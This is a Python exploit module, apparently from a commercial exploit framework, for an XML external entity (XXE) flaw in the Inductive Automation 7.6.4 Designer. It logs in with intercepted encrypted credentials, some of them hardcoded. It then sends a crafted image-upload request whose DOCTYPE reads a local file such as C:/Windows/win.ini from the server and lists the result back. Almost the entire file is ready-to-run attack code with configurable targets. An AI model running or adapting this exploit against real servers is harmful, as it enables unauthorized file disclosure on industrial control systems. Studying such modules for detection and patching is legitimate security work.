from Sploit import Sploit
from collections import OrderedDict
import xml.etree.ElementTree as ET
import urllib2

INFO = {}
INFO['NAME'] = "efs_inductive_automation_7_6_4_designer_xxe"
INFO['DESCRIPTION'] = "Inductive Automation 7.6.4 Designer app XXE"
INFO['VENDOR'] = "https://inductiveautomation.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The specific flaw exists in the Designer app.
It uses XML formatted HTTP requests to server to get and send data. Lack of input validation on image upload allows file disclosure via XXE attack.
Authentication is required. The application sends login request with encrypted login and password, so in order to use this module
you will have to intercept that request and extract your values of login and password. Because of that, it may be impossible to extract that data if the server uses HTTPS.
Therefore, this module is mostly a Proof of Concept.
Tested on Windows 7 x64.
"""
INFO['DOWNLOAD_LINK'] = "https://inductiveautomation.com/downloads/ignition"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Mine/"
INFO['AUTHOR'] = "13 Dec 2018, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.56.101', dict(description='Target host')
OPTIONS['PORT'] = '8088', dict(description='Target port')
OPTIONS["BASEPATH"] = '/'
OPTIONS['SSL'] = False, dict(description='Use SSL?')
OPTIONS['LOGIN'] = '', dict(description='Encrypted login')
OPTIONS['PASSWORD'] = '', dict(description='Encrypted password')
OPTIONS['FILE_PATH'] = 'C:/Windows/win.ini', dict(description='Path to the file')

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = '8088'
        self.cookie = ''
        self.protocol = 'http'
        self.basepath = '/'
        self.file_path = 'C:/Windows/win.ini'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = self.args.get('PORT', self.port)
        self.file_path = self.args.get('FILE_PATH', self.file_path)

        self.protocol = 'https' if self.args.get('SSL') else 'http'

        self.basepath = self.args.get("BASEPATH", self.basepath)
        if self.basepath == '/':
            self.basepath = ''
        else:
            self.basepath = '/' + self.basepath.strip('/')

        self.url = '{}://{}:{}{}/main/system/gateway'.format(self.protocol, self.host, self.port, self.basepath)

    def auth(self, username_enc='e5ac043c7cef1fde', password_enc='1dec500a51e36debd310d5418db630fa'):
        xml = """<?xml version="1.0" encoding="UTF-8"?><requestwrapper><version>4203045187</version><scope>2</scope><message><messagetype>122</messagetype><messagebody><arg name="username"><![CDATA[{}]]></arg><arg name="password"><![CDATA[{}]]></arg><arg name="version.build"><![CDATA[2013112117]]></arg><arg name="timezone"><![CDATA[Europe/Moscow]]></arg></messagebody></message><locale><l>en</l><c>US</c><v></v></locale></requestwrapper>""".format(username_enc, password_enc)
        req = urllib2.Request(self.url, xml)
        resp = urllib2.urlopen(req)
        root = ET.fromstring(resp.read())
        # returns cookie
        self.cookie = root[1].text

    def upload(self, path='c:/Windows/win.ini'):
    # XXE file disclosure
        print('Beginning upload...')
        xml = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE abc [<!ENTITY ent SYSTEM "file:///{}">]><requestwrapper><version>4203045187</version><scope>2</scope><message><messagetype>128</messagetype><messagebody><arg name="name">&ent;</arg><arg name="desc"><![CDATA[]]></arg><arg name="type"><![CDATA[PNG]]></arg><arg name="parent"><![CDATA[Builtin/]]></arg><arg name="width"><![CDATA[1024]]></arg><arg name="height"><![CDATA[768]]></arg><arg name="length"><![CDATA[879394]]></arg><arg name="data"><![CDATA[1]]></arg></messagebody></message><cookie>{}</cookie><locale><l>en</l><c>US</c><v></v></locale></requestwrapper>""".format(path, self.cookie)
        req = urllib2.Request(self.url, xml)
        resp = urllib2.urlopen(req)
        if '<R><D>OK</D></R>' in resp.read():
            return True
        else:
            return False
    def list_files(self):
        xml = """<?xml version="1.0" encoding="UTF-8"?><requestwrapper><version>4203045187</version><scope>2</scope><message><messagetype>126</messagetype><messagebody><arg name="folder"><![CDATA[Builtin/]]></arg></messagebody></message><cookie>{}</cookie><locale><l>en</l><c>US</c><v></v></locale></requestwrapper>""".format(self.cookie)
        req = urllib2.Request(self.url, xml)
        resp = urllib2.urlopen(req)
        root = ET.fromstring(resp.read())
        root = root[0][1]
        # prints files and folders located at /Builtin
        for row in root:
            self.log(row[0].text)

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('Be aware that it is only possible to retrieve data that doesn\'t contain illegal Windows path chars')
        self.auth()
        if self.upload(self.file_path):
            self.log('Upload complete. Retrieving data...')
            self.list_files()
            self.finish(True)
        self.log('Failed')
        self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()